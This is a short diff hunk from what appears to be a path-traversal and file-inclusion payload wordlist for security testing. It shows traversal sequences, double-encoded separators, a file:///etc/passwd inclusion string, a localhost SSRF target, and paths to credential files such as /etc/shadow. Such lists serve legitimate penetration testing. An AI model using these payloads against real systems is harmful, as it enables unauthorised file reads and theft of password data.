@@ -15,12 +15,12 @@
 ..././
 ...\.\
 ..;/
-http://domain.tld/page.jsp?include=..;/..;/sensitive.txt 
+..;/..;/sensitive.txt 
 . = %252e
 / = %252f
 \ = %255c
-url:file:///etc/passwd
-url:http://127.0.0.1:8080
+file:///etc/passwd
+http://127.0.0.1:8080
 /etc/issue
 /etc/passwd
 /etc/shadow
